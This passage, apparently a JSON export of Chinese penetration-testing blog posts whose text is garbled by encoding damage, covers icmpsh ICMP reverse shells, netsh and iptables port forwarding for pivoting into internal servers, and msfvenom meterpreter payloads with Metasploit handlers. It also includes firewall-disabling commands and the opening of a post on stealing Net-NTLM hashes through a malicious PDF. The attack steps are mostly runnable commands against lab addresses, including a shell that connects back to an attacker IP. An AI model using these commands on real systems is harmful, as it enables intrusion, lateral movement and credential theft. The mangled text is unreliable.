&quot;$IPINT&quot; |grep &quot;inet addr:&quot; |cut -d &quot;:&quot; -f 2 |awk &#x27;&#123; print $1 &#125;&#x27;) æ”¹æˆ 1IP=$(ifconfig | grep &#x27;inet &#x27;| grep -v &#x27;127.0.0.1&#x27; | awk &#x27;&#123; print $2&#125;&#x27;) æˆåŠŸè¿è¡Œrun.shï¼Œå¼€å¯æœ¬åœ°ç›‘å¬ã€‚ å®¢æˆ·ç«¯Windowså°†icmpsh.exeä¼ åˆ°ç›®æ ‡æœºä¸­ï¼Œæ‰§è¡Œä¸Šè¿°å‘½ä»¤ã€‚ 12345icmpsh.exe -t &lt;Attacker IP&gt; -d 500 -b 30 -s 128-d milliseconds ä»¥æ¯«ç§’ä¸ºå•ä½çš„è¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿ (é»˜è®¤ 200)-b num æœ€å¤§ç©ºç™½æ•° (æœªç­”å¤çš„ICMPè¯·æ±‚)-s bytes ä»¥å­—èŠ‚ä¸ºå•ä½çš„æœ€å¤§æ•°æ®ç¼“å†²åŒºå¤§å° (é»˜è®¤ 64 å­—èŠ‚) æ”»å‡»æœºæˆåŠŸæ¥æ”¶åˆ°åå¼¹ä¼šè¯ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªç®¡é“æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ é€šè¿‡wiresharkæŠ“åŒ…åˆ†æï¼Œæ”»å‡»æœºä¸ç›®æ ‡æœºé€šä¿¡è¿‡ç¨‹ä¸­å‡æ˜¯ç”±ICMPåè®®è¿›è¡Œæ•°æ®åŒ…ä¼ è¾“çš„ã€‚ Linuxè¯¥ç‰ˆæœ¬çš„liunxå®¢æˆ·ç«¯æ˜¯åœ¨icmpshé¡¹ç›®ä¸Šè¿›è¡Œæ”¹åŠ¨çš„ï¼Œä½†ä¹Ÿæ˜¯ä¸icmpsh_m.pyç»“åˆä½¿ç”¨ã€‚ æ‰§è¡Œå‰è¦ä¿è¯æ˜¯rootæƒé™ï¼Œæˆ–è€… net.ipv4.ping_group_range /proc/sys/ å…è®¸åœ¨å…¶ä»–ç”¨æˆ·ä¸Šè¿è¡Œã€‚ 1234git clone https://github.com/ewilded/icmpsh-s-linux.gitcd icmpsh-s-linux/gcc icmpsh-s-linux.c -o icmpsh-s-linux./icmpsh-s-linux -t 192.168.199.131 -v æ”»å‡»æœºè¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1python icmpsh_m.py &lt;Attacker IP&gt; &lt;Target IP&gt; æ€»ç»“æ­¤Shellï¼Œæ˜¯é€šè¿‡ICMPæ¥è¿›è¡Œè¯·æ±‚/å“åº”ã€‚è¿™ä¹Ÿæ˜¯å”¯ä¸€ä¸ç›®æ ‡æœºé€šä¿¡çš„æ–¹å¼ã€‚å½“é€€å‡ºshellæ—¶ï¼Œä¼šé‡æ–°å¯ç”¨ICMPå“åº”ï¼Œå¦‚æœç¦ç”¨åˆ™ä¼šç»§ç»­ã€‚ Referencehttp://inquisb.github.io/icmpsh/ https://github.com/ewilded/icmpsh-s-linux","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"å†…ç½‘ç©¿é€","slug":"å†…ç½‘ç©¿é€","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"åˆ©ç”¨netshè¿›è¡Œç«¯å£è½¬å‘","slug":"åˆ©ç”¨netshè¿›è¡Œç«¯å£è½¬å‘","date":"2020-02-09T08:47:35.000Z","updated":"2021-07-07T07:15:28.489Z","comments":true,"path":"2020/0209/.html","link":"","permalink":"https://payloads.cn/2020/0209/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn ç®€ä»‹è‡ªWindows XPå¼€å§‹ï¼ŒWindowsä¸­å°±å†…ç½®ç½‘ç»œç«¯å£è½¬å‘çš„åŠŸèƒ½ã€‚ä»»ä½•ä¼ å…¥åˆ°æœ¬åœ°ç«¯å£çš„TCPè¿æ¥ï¼ˆIPv4æˆ–IPv6ï¼‰éƒ½å¯ä»¥è¢«é‡å®šå‘åˆ°å¦ä¸€ä¸ªæœ¬åœ°ç«¯å£ï¼Œæˆ–è¿œç¨‹è®¡ç®—æœºä¸Šçš„ç«¯å£ï¼Œå¹¶ä¸”ç³»ç»Ÿä¸éœ€è¦æœ‰ä¸€ä¸ªä¸“é—¨ç”¨äºä¾¦å¬è¯¥ç«¯å£çš„æœåŠ¡ã€‚ å¯¹äºæ¸—é€æ¥è¯´ï¼Œä¹Ÿæ˜¯ä¸€æ¬¾éå¸¸å¥½ç”¨çš„å·¥å…·ã€‚æ¯”å¦‚ï¼šè¿›è¡Œå„ç±»å¸¸è§„ tcpã€udp ç«¯å£ â€æ­£å‘â€ è½¬å‘ä»¥åŠå¯¹æŒ‡å®šé˜²ç«å¢™è§„åˆ™çš„å„ç§å¢åˆ æ“ä½œç­‰ã€‚ å‘½ä»¤è¯­æ³•å…³äºnetshç«¯å£è½¬å‘çš„å‘½ä»¤è¯­æ³•å¦‚ä¸‹ï¼š 1netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport listenaddress â€“ ç­‰å¾…è¿æ¥çš„æœ¬åœ°IPåœ°å€ã€‚ listenport â€“ æœ¬åœ°ä¾¦å¬TCPç«¯å£ã€‚ connectaddress â€“ å°†ä¼ å…¥è¿æ¥é‡å®šå‘åˆ°æœ¬åœ°æˆ–è¿œç¨‹IPåœ°å€ï¼ˆæˆ–DNSåç§°ï¼‰ connectport â€“ è¿œç¨‹ç«¯å£ é˜²ç«å¢™ç®¡ç†åœ¨ windows2003ä¸‹ä½¿ç”¨netshï¼Œéœ€è¦å…ˆå®‰è£…å¥½ipv6æ”¯æŒï¼Œç”±äºnetshåŒæ—¶æ”¯æŒipv4å’Œipv6ç«¯å£è½¬å‘ï¼Œå¦‚æœä¸è£…ï¼Œnetshå·¥ä½œå¯èƒ½ä¼šæœ‰äº›é—®é¢˜ã€‚ 1netsh interface ipv6 install è£…å®Œåç«‹é©¬é‡å¯ç³»ç»Ÿ Win2003 ä¹‹å‰ç³»ç»Ÿå…³äºnetshåœ¨2003ä¸‹çš„æ“ä½œå‘½ä»¤ç›¸å¯¹äºä¹‹åçš„ç³»ç»Ÿæœ‰æ‰€ä¸åŒ 123netsh firewall show state æŸ¥çœ‹å½“å‰ç³»ç»Ÿé˜²ç«å¢™çŠ¶æ€netsh firewall set opmode disable å…³é—­å½“å‰ç³»ç»Ÿé˜²ç«å¢™netsh firewall set opmode enable å¯ç”¨å½“å‰ç³»ç»Ÿé˜²ç«å¢™ Win2003 ä¹‹åç³»ç»Ÿ12345netsh advfirewall show allprofiles æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ‰€æœ‰ç½‘ç»œç±»å‹çš„é˜²ç«å¢™çŠ¶æ€,æ¯”å¦‚,ç§æœ‰,å…¬å…±,åŸŸç½‘ç»œ å…³é—­å½“å‰ç³»ç»Ÿé˜²ç«å¢™netsh advfirewall set allprofiles state off å…³é—­å½“å‰ç³»ç»Ÿé˜²ç«å¢™netsh advfirewall set allprofiles state on å¯ç”¨å½“å‰ç³»ç»Ÿé˜²ç«å¢™netsh advfirewall reset é‡ç½®å½“å‰ç³»ç»Ÿçš„æ‰€æœ‰é˜²ç«å¢™è§„åˆ™,ä¼šåˆè¯†åˆ°åˆšè£…å®Œç³»ç»Ÿçš„çŠ¶æ€netsh advfirewall set currentprofile logging filename &quot;C:\\windows\\temp\\fw.log&quot; è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—ä½ç½® å¢åˆ æ“ä½œ1234567add å¢åŠ è§„åˆ™delete åˆ é™¤è§„åˆ™allow å…è®¸è¿æ¥block é˜»æ–­è¿æ¥in å…¥ç«™out å‡ºç«™name è¦æ˜¾ç¤ºçš„è§„åˆ™åç§° å®ä¾‹è¯´æ˜ç¯å¢ƒå‡†å¤‡â˜ï¸VPSæ”»å‡»æœº 192.168.199.246 â˜ï¸ç›®æ ‡è¾¹ç•ŒWindows 2008æœåŠ¡å™¨ï¼ˆå‡ºç½‘ï¼‰ å†…ç½‘IP 192.168.144.202 ç›®æ ‡å†…ç½‘Widnwos 2003æœåŠ¡å™¨(ä¸å‡ºç½‘) å†…ç½‘IP 192.168.144.155 åˆ©ç”¨åœºæ™¯RDPç«¯å£è½¬å‘é€šè¿‡â˜ï¸ç›®æ ‡è¾¹ç•Œ2008æœåŠ¡å™¨è®¿é—®ç›®æ ‡å†…ç½‘2003æœåŠ¡å™¨çš„è¿œç¨‹æ¡Œé¢RDPï¼š ã€æ³¨ï¼šè¾¹ç•ŒæœåŠ¡å™¨æ‰§è¡Œnetshã€‘ 1234netsh advfirewall firewall add rule name=&quot;2003-rdp&quot; dir=in action=allow protocol=TCP localport=33389 netsh interface portproxy add v4tov4 listenport=33389 connectaddress=192.168.144.155 connectport=3389netsh interface portproxy show all æŸ¥çœ‹æ‰€æœ‰è½¬å‘è§„åˆ™netstat -ano | findstr 33389 é€šè¿‡è¿æ¥â˜ï¸è¾¹ç•Œ2008æœåŠ¡å™¨æˆåŠŸç™»å½•åˆ°å†…ç½‘2003æœåŠ¡å™¨ã€‚ ç«¯å£è½¬å‘åˆ©ç”¨åï¼Œå°†è½¬å‘è§„åˆ™åˆ é™¤ã€‚ 123netsh advfirewall firewall delete rule name=&quot;2008-rdp&quot; dir=in protocol=TCP localport=33389netsh interface portproxy delete v4tov4 listenport=33389netsh interface portproxy show all Metasploitä¸Šçº¿é€šè¿‡â˜ï¸è¾¹ç•Œ2008æœåŠ¡å™¨æŠŠå…¶å†…ç½‘2003æœåŠ¡å™¨(ä¸å‡ºç½‘)é€šè¿‡payloadä¸Šçº¿åˆ°â˜ï¸VPSæ”»å‡»æœºçš„metasploitä¸Šã€‚ 1234netsh advfirewall firewall add rule name=&quot;mete bind&quot; dir=in action=allow protocol=TCP localport=5353 netsh interface portproxy add v4tov4 listenport=5353 connectaddress=192.168.144.155 connectport=53netsh interface portproxy show allnetstat -ano | findstr 5353 é€šè¿‡msfvenomç”Ÿæˆæ­£å‘çš„payloadï¼Œahostä¸ºå…è®¸è®¿é—®çš„æœºå™¨ï¼Œå°†è¯¥payloadåœ¨å†…ç½‘2003æœåŠ¡å™¨(ä¸å‡ºç½‘) ä¸Šæ‰§è¡Œã€‚ 1sudo msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;53 AHOST&#x3D;192.168.144.155 -f exe &gt; netsh.exe æ¥ç€ï¼Œåœ¨â˜ï¸VPSæ”»å‡»æœºå¯ç”¨metasploitç›‘å¬åï¼Œå†…ç½‘2003æœåŠ¡å™¨(ä¸å‡ºç½‘)æˆåŠŸä¸Šçº¿ã€‚ 1234567sudo msfconsole -qmsf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/bind_tcpmsf5 exploit(multi/handler) &gt; set ahost 192.168.144.155 #åªå…è®¸è®¿é—®IP(å†…ç½‘æœåŠ¡å™¨IP)msf5 exploit(multi/handler) &gt; set rhost 192.168.144.202 #è¾¹ç•ŒæœåŠ¡å™¨IPmsf5 exploit(multi/handler) &gt; set lport 5353 #è¾¹ç•ŒæœåŠ¡å™¨portmsf5 exploit(multi/handler) &gt; run -j ç«¯å£è½¬å‘åˆ©ç”¨åï¼Œå°†è½¬å‘è§„åˆ™åˆ é™¤ã€‚ 123netsh advfirewall firewall delete rule name=&quot;mete bind&quot; dir=in protocol=TCP localport=5353netsh interface portproxy delete v4tov4 listenport=5353netsh interface portproxy show all å»ºè®® å°½é‡é€‰æ‹©ç©¿é€æ€§è¾ƒå¥½çš„ç«¯å£ ç”¨äºè½¬å‘çš„ç«¯å£ä¸èƒ½å’Œç›®æ ‡ç³»ç»Ÿä¸­ç°æœ‰çš„ç«¯å£å†²çª â€¦â€¦","categories":[{"name":"ç«¯å£è½¬å‘","slug":"ç«¯å£è½¬å‘","permalink":"https://payloads.cn/categories/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"}],"tags":[{"name":"å†…ç½‘ç©¿é€","slug":"å†…ç½‘ç©¿é€","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"åˆ©ç”¨iptablesè¿›è¡Œç«¯å£è½¬å‘","slug":"åˆ©ç”¨iptablesè¿›è¡Œç«¯å£è½¬å‘","date":"2020-02-09T08:40:18.000Z","updated":"2021-07-07T07:15:24.266Z","comments":true,"path":"2020/0209/.html","link":"","permalink":"https://payloads.cn/2020/0209/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn ç®€ä»‹iptableså…¶å®ä¸æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒç†è§£æˆä¸€ä¸ªå®¢æˆ·ç«¯ä»£ç†ï¼Œç”¨æˆ·é€šè¿‡iptablesè¿™ä¸ªä»£ç†ï¼Œå°†ç”¨æˆ·çš„å®‰å…¨è®¾å®šæ‰§è¡Œåˆ°å¯¹åº”çš„â€œå®‰å…¨æ¡†æ¶â€ä¸­ï¼Œè¿™ä¸ªâ€œå®‰å…¨æ¡†æ¶â€æ‰æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œè¿™ä¸ªæ¡†æ¶çš„åå­—å«netfilterã€‚å®ƒæ‰æ˜¯é˜²ç«å¢™çœŸæ­£çš„å®‰å…¨æ¡†æ¶(framework)ï¼Œnetfilterä½äºå†…æ ¸ç©ºé—´ã€‚ æ‰€ä»¥ï¼Œå¯ä»¥ç†è§£ä¸ºï¼šiptableså…¶å®æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œä½äºç”¨æˆ·ç©ºé—´ï¼Œæˆ‘ä»¬ç”¨è¿™ä¸ªå·¥å…·æ“ä½œçœŸæ­£çš„æ¡†æ¶ã€‚ è§„åˆ™ç¼–å†™1iptables table command chain Parameter&amp;Xmatch target #è¡¨å å‘½ä»¤ é“¾å åŒ¹é…æ¡ä»¶ ç›®æ ‡åŠ¨ä½œæˆ–è·³è½¬ å‚æ•°è¯¦è§£å…³äºç«¯å£è½¬å‘å¸¸ç”¨é€‰é¡¹çš„ç®€è¦è¯´æ˜ï¼š 12345678910-t #æŒ‡å®šè¡¨-A #åœ¨æŒ‡å®šçš„é“¾ç»“å°¾è¿½åŠ ä¸€æ¡æ–°è§„åˆ™-D #åˆ é™¤æŒ‡å®šé“¾ä¸­çš„æŸæ¡è§„åˆ™-L #æ‰“å°æŒ‡å®šé“¾çš„æ‰€æœ‰è§„åˆ™åˆ—è¡¨ -P #è®¾ç½®ä¸ºæŒ‡å®šé“¾çš„é»˜è®¤è§„åˆ™ -d #æŒ‡æ˜æ•°æ®åŒ…çš„ç›®çš„ ip-s #æŒ‡æ˜æ•°æ®åŒ…çš„æº ip-p #æŒ‡æ˜åè®®,å¦‚,tcp,udp,icmp -m #æ‰©å±•é€‰é¡¹-j #æŒ‡æ˜å®é™…çš„å¤„ç†åŠ¨ä½œ å››è¡¨äº”é“¾åˆæ­¥è®¤è¯†iptableså››è¡¨äº”é“¾çš„ä¸€äº›å·¥ä½œç‰¹æ€§ï¼š å››è¡¨ï¼š 1234Filter #ä¸»è¦ç”¨äºå¯¹æ•°æ®åŒ…è¿›è¡Œè¿‡æ»¤ï¼Œæ ¹æ®å…·ä½“çš„è§„åˆ™å†³å®šæ˜¯å¦æ”¾è¡Œè¯¥æ•°æ®åŒ…ã€‚Nat #ä¸»è¦ç”¨äºä¿®æ”¹æ•°æ®åŒ…çš„IPåœ°å€ ç«¯å£ä¿¡æ¯ç­‰(ç½‘ç»œåœ°å€è½¬æ¢)ã€‚Mangle #ä¸»è¦ç”¨äºä¿®æ”¹æ•°æ®åŒ…çš„TOS TTL ä»¥åŠæ•°æ®åŒ…è®¾ç½®çš„markæ ‡è®°ã€‚Raw #ä¸»è¦ç”¨äºå†³å®šæ•°æ®åŒ…æ˜¯å¦è¢«çŠ¶æ€è·Ÿè¸ªæœºåˆ¶å¤„ç†ã€‚åœ¨åŒ¹é…æ•°æ®åŒ…æ—¶ï¼Œrawè¡¨çš„è§„åˆ™è¦ä¼˜å…ˆäºå…¶ä»–è¡¨ã€‚ äº”é“¾ï¼š 12345INPUT #ç”¨äºä¿®æ”¹æ•°æ®åŒ…çš„æœåŠ¡ç±»å‹,TTL... å†³å®šæ•°æ®åŒ…æ˜¯å¦è¢«çŠ¶æ€è·Ÿè¸ªæœºåˆ¶å¤„ç†OUTPUT #å¤„ç†æ¥è‡ªå¤–éƒ¨çš„æ•°æ®åŒ… [ç›¸å½“äº windows é˜²ç«å¢™çš„å…¥ç«™]FORWARD #å¤„ç†æµå‘å¤–éƒ¨çš„æ•°æ®åŒ… [ç›¸å½“äº windows é˜²ç«å¢™çš„å‡ºç«™] PREROUTING #å°†æ•°æ®ç›´æ¥è½¬å‘åˆ°æœ¬æœºçš„å…¶å®ƒç½‘å¡æ¥å£ä¸Š å¯¹æ•°æ®åŒ…ä½œè·¯ç”±é€‰æ‹©å‰åº”ç”¨æ­¤é“¾ä¸­çš„è§„åˆ™[æ‰€æœ‰çš„æ•°æ®åŒ…è¿›æ¥æ—¶éƒ½å…ˆç”±æ­¤é“¾å¤„ç†] POSTROUTING #å¯¹æ•°æ®åŒ…ä½œè·¯ç”±é€‰æ‹©ååº”ç”¨æ­¤é“¾ä¸­çš„è§„åˆ™[æ‰€æœ‰çš„æ•°æ®åŒ…å‡ºæ¥çš„æ—¶ä¾¯éƒ½å…ˆç”±è¿™ä¸ªé“¾å¤„ç†] å„è¡¨å¯¹åº”è§„åˆ™é“¾å¦‚ä¸‹ï¼š å¸¸ç”¨å‘½ä»¤åŸºæœ¬å‘½ä»¤ 1234iptables -t nat -A PREROUTING -p tcp --dport [ç«¯å£å·] -j DNAT --to-destination [ç›®æ ‡IP]iptables -t nat -A PREROUTING -p udp --dport [ç«¯å£å·] -j DNAT --to-destination [ç›®æ ‡IP]iptables -t nat -A POSTROUTING -p tcp -d [ç›®æ ‡IP] --dport [ç«¯å£å·] -j SNAT --to-source [æœ¬åœ°æœåŠ¡å™¨IP]iptables -t nat -A POSTROUTING -p udp -d [ç›®æ ‡IP] --dport [ç«¯å£å·] -j SNAT --to-source [æœ¬åœ°æœåŠ¡å™¨IP] å¤šç«¯å£è½¬å‘ä¿®æ”¹æ–¹æ¡ˆï¼š ( å°†æœ¬åœ°æœåŠ¡å™¨çš„ 5000065535 è½¬å‘è‡³ç›®æ ‡ IP ä¸º 1.1.1.1 çš„ 5000065535 ç«¯å£ ) 1234iptables -t nat -A PREROUTING -p tcp -m tcp --dport 50000:65535 -j DNAT --to-destination 1.1.1.1iptables -t nat -A PREROUTING -p udp -m udp --dport 50000:65535 -j DNAT --to-destination 1.1.1.1iptables -t nat -A POSTROUTING -d 1.1.1.1 -p tcp -m tcp --dport 50000:65535 -j SNAT --to-source [æœ¬åœ°æœåŠ¡å™¨IP]iptables -t nat -A POSTROUTING -d 1.1.1.1 -p udp -m udp --dport 50000:65535 -j SNAT --to-source [æœ¬åœ°æœåŠ¡å™¨IP] éåŒç«¯å£å·ä¿®æ”¹æ–¹æ¡ˆï¼šï¼ˆä½¿ç”¨æœ¬åœ°æœåŠ¡å™¨çš„ 60000 ç«¯å£æ¥è½¬å‘ç›®æ ‡ IP ä¸º 1.1.1.1 çš„ 50000 ç«¯å£ï¼‰ 1234iptables -t nat -A PREROUTING -p tcp -m tcp --dport 60000 -j DNAT --to-destination 1.1.1.1:50000iptables -t nat -A PREROUTING -p udp -m udp --dport 60000 -j DNAT --to-destination 1.1.1.1:50000iptables -t nat -A POSTROUTING -d 1.1.1.1 -p tcp -m tcp --dport 50000 -j SNAT --to-source [æœ¬åœ°æœåŠ¡å™¨IP]iptables -t nat -A POSTROUTING -d 1.1.1.1 -p udp -m udp --dport 50000 -j SNAT --to-source [æœ¬åœ°æœåŠ¡å™¨IP] æŸ¥çœ‹ NAT è§„åˆ™ 1iptables -t nat -vnL åˆ é™¤ NAT è§„åˆ™é€šè¿‡ä¸Šé¢çš„æŸ¥çœ‹è§„åˆ™å‘½ä»¤ï¼ŒæŸ¥çœ‹è§„åˆ™åï¼Œç¡®å®šä½ è¦åˆ é™¤çš„è§„åˆ™çš„é¡ºåºï¼Œä¸‹é¢çš„å‘½ä»¤æ˜¯åˆ é™¤ç¬¬ä¸€ä¸ªè§„åˆ™ã€‚ 12iptables -t nat -D PREROUTING 1iptables -t nat -D POSTROUTING 1 å®ä¾‹è¯´æ˜ç¯å¢ƒå‡†å¤‡â˜ï¸VPSæ”»å‡»æœº 192.168.199.246 â˜ï¸ç›®æ ‡è¾¹ç•ŒLinux webæœåŠ¡å™¨ï¼ˆå‡ºç½‘ï¼‰ å†…ç½‘IP 192.168.144.203 ç›®æ ‡å†…ç½‘Widnwos webæœåŠ¡å™¨(ä¸å‡ºç½‘) å†…ç½‘IP 192.168.144.211 å¼€å¯è·¯ç”±è½¬å‘é¦–å…ˆï¼Œåœ¨ç›®æ ‡è¾¹ç•ŒæœåŠ¡å™¨ä¸Šçš„å¼€å¯ç³»ç»Ÿè·¯ç”±è½¬å‘åŠŸèƒ½ï¼š 123sed -i &#x27;/net.ipv4.ip_forward/ s/\\(.*= \\).*/\\11/&#x27; /etc/sysctl.confgrep &quot;net.ipv4.ip_forward&quot; /etc/sysctl.confsysctl -p #ä½¿ç”¨å‘½ä»¤è®©é…ç½®é©¬ä¸Šç”Ÿæ•ˆ åˆ©ç”¨åœºæ™¯RDPç«¯å£è½¬å‘é€šè¿‡â˜ï¸ç›®æ ‡è¾¹ç•ŒæœåŠ¡å™¨è®¿é—®ç›®æ ‡å†…ç½‘æœåŠ¡å™¨çš„è¿œç¨‹æ¡Œé¢RDPï¼š 1/sbin/iptables -P INPUT ACCEPT #é»˜è®¤è¾“å…¥ä¸ºå…è®¸ å°†192.168.144.203çš„5353ç«¯å£çš„å…¨éƒ¨æ•°æ®åŒ…è½¬æ¢ä¸ºç›®çš„192.168.144.211çš„3389ç«¯å£ä¸Šï¼Œè¿™ä¸€æ­¥åªæ˜¯å…ˆæŠŠæ•°æ®åŒ…åœ°å€è½¬æ¢è¿‡æ¥ã€‚ ã€æ³¨ï¼š192.168.144.203çš„5353ç«¯å£ä¸ºå¼€æ”¾çŠ¶æ€ã€‘ 1iptables -t nat -A PREROUTING -d 192.168.144.203 -p tcp -m tcp --dport 5353 -j DNAT --to-destination 192.168.144.211:3389 é€šä¿—æ¥è®²å°±æ˜¯å‘Šè¯‰iptablesï¼Œç›®çš„192.168.144.211çš„3389ç«¯å£çš„æ•°æ®åŒ…éƒ½ä»192.168.122.144è¿™ä¸ªåœ°å€ä¸Šèµ°ï¼Œè¿™æ ·å°±èƒ½è®¿é—®åˆ°æŒ‡å®šçš„ç›®æ ‡å†…ç½‘æœºå™¨ ã€‚ 1iptables -t nat -A POSTROUTING -d 192.168.144.211 -p tcp -m tcp --dport 3389 -j SNAT --to-source 192.168.144.203 å°†è½¬å‘è§„åˆ™ä»eth0ç½‘å¡æµå‡ºã€‚ 1iptables -A FORWARD -o eth0 -d 192.168.144.211 -p tcp --dport 3389 -j ACCEPT ä¿å­˜iptablesè®¾ç½®å¹¶é‡å¯ã€‚ 1/etc/init.d/iptables save &amp;&amp; /etc/init.d/iptables restart æŸ¥çœ‹ iptables çš„ NAT è§„åˆ™ã€‚ 1iptables -t nat -vnL é€šè¿‡â˜ï¸ç›®æ ‡è¾¹ç•ŒæœåŠ¡å™¨æˆåŠŸç™»å½•åˆ°ç›®æ ‡å†…ç½‘æœåŠ¡å™¨ã€‚ Metasploitä¸Šçº¿é€šè¿‡â˜ï¸ç›®æ ‡è¾¹ç•ŒæœåŠ¡å™¨æŠŠå…¶ç›®æ ‡å†…ç½‘æœåŠ¡å™¨(ä¸å‡ºç½‘)é€šè¿‡payloadä¸Šçº¿åˆ°â˜ï¸VPSæ”»å‡»æœºçš„metasploitä¸Šã€‚ 12345/sbin/iptables -P INPUT ACCEPTiptables -t nat -A PREROUTING -d 192.168.144.203 -p tcp -m tcp --dport 5353 -j DNAT --to-destination 192.168.144.211:53iptables -t nat -A POSTROUTING -d 192.168.144.211 -p tcp -m tcp --dport 53 -j SNAT --to-source 192.168.144.203iptables -A FORWARD -o eth0 -d 192.168.144.211 -p tcp --dport 53 -j ACCEPT/etc/init.d/iptables save &amp;&amp; /etc/init.d/iptables restart é€šè¿‡msfvenomç”Ÿæˆæ­£å‘çš„payloadã€‚ 1sudo msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp lport&#x3D;53 -f exe &gt; fw.exe æ¥ç€ï¼Œåœ¨â˜ï¸VPSæ”»å‡»æœºå¯ç”¨metasploitç›‘å¬åï¼Œå°†è¯¥payloadåœ¨ç›®æ ‡å†…ç½‘æœåŠ¡å™¨(ä¸å‡ºç½‘) ä¸Šæ‰§è¡Œã€‚ 123456sudo msfconsole -qmsf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcpmsf5 exploit(multi/handler) &gt; set rhost 192.168.144.203 #è¾¹ç•ŒæœåŠ¡å™¨IPmsf5 exploit(multi/handler) &gt; set lport 5353 #è¾¹ç•ŒæœåŠ¡å™¨portmsf5 exploit(multi/handler) &gt; run -j æœ€åï¼Œç›®æ ‡å†…ç½‘æœåŠ¡å™¨(ä¸å‡ºç½‘)æˆåŠŸä¸Šçº¿åˆ°â˜ï¸VPSæ”»å‡»æœºçš„metasploitä¸Šã€‚ æ€»ç»“Linuxçš„iptablesæœ‰äº›ç±»ä¼¼windowsçš„netshï¼Œä½†iptablesçš„åŠŸèƒ½æ›´åŠ å¼ºå¤§ã€‚ç”±äºéœ€è¦äº‹å…ˆå¼€å¯ç›®æ ‡ç³»ç»Ÿçš„è·¯ç”±è½¬å‘åŠŸèƒ½ï¼Œæ‰€ä»¥rootæƒé™æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œä¸€åˆ‡éƒ½éœ€åœ¨ææƒä¹‹åè¿›è¡Œã€‚","categories":[{"name":"ç«¯å£è½¬å‘","slug":"ç«¯å£è½¬å‘","permalink":"https://payloads.cn/categories/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"}],"tags":[{"name":"å†…ç½‘ç©¿é€","slug":"å†…ç½‘ç©¿é€","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"åˆ©ç”¨PDFæ–‡ä»¶è·å–Net-NTLM hash","slug":"åˆ©ç”¨PDFæ–‡ä»¶è·å–Net-NTLM-hash","date":"2020-02-03T08:54:50.000Z","updated":"2021-07-07T07:15:32.860Z","comments":true,"path":"2020/0203/.html","link":"","permalink":"https://payloads.cn/2020/0203/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€å½“ç”¨æˆ·ä½¿ç”¨PDFé˜…è¯»å™¨æ‰“å¼€ä¸€ä»½æ¶æ„çš„PDFæ–‡æ¡£ï¼Œè¯¥PDFä¼šå‘è¿œç¨‹SMBæœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œå¦‚æœè¯¥è¿œç¨‹SMBæœåŠ¡å™¨å¯¹æ•°æ®åŒ…è¿›è¡ŒæŠ“å–ï¼Œå°±èƒ½å¤Ÿè·å¾—ç”¨æˆ·Windowsç³»ç»Ÿçš„Net NTLM Hashï¼Œé€šè¿‡ä½¿ç”¨Hashcatæš´åŠ›ç ´è§£è¿˜åŸå°±æœ‰å¯èƒ½è·å¾—ç”¨æˆ·ç³»ç»Ÿçš„æ˜æ–‡å¯†ç ã€‚ åˆ©ç”¨åŸç†åœ¨ PDF è§„èŒƒå…è®¸ä¸º GoTobe å’Œ GoToR æ¡ç›®æ¥åŠ è½½è¿œç¨‹æ•°æ®ï¼Œæ­£æ˜¯åˆ©ç”¨è¿™ä¸€ç‰¹æ€§èƒ½å¤Ÿå¸®æˆ‘ä»¬è¯·æ±‚è¿œç¨‹æ¶æ„ smb æœåŠ¡å™¨ï¼Œä»¥æ­¤è¾¾åˆ°æˆªè·ç›®æ ‡ç³»ç»Ÿç”¨æˆ·å¯†ç  hash çš„ç›®çš„ã€‚ åˆ©ç”¨æ€è·¯ æ„é€ ä¸€ä»½ç‰¹æ®Šçš„PDFæ–‡æ¡£ï¼Œè¯·æ±‚SMBæœåŠ¡å™¨çš„ä¸€ä»½æ–‡ä»¶ åœ¨SMBæœåŠ¡å™¨ä¸ŠæŠ“åŒ… ç”¨æˆ·ä½¿ç”¨PDFé˜…è¯»å™¨æ‰“å¼€PDFæ–‡æ¡£æ—¶ï¼ŒWindowsç³»ç»Ÿå°†å½“å‰ç”¨æˆ·çš„Net NTLM Hashå‘é€åˆ°SMBæœåŠ¡å™¨ SMBæœåŠ¡å™¨æå–å‡ºNet NTLM Hashï¼Œä½¿ç”¨Hashcatè¿›è¡Œç ´è§£ 